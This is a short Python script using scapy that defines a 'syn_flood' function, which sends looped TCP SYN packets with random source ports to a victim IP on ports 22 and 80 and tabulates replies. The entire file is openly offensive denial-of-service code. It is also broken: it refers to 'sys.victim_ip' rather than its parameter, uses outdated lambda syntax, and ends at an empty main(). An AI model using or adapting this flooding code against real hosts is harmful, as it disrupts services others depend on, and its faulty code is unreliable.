import sys
from scapy.all import *

def syn_flood(victim_ip):
    p=IP(dst=sys.victim_ip,id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
    ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
    ans.summary()
    unans.summary()
    ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))

def main():

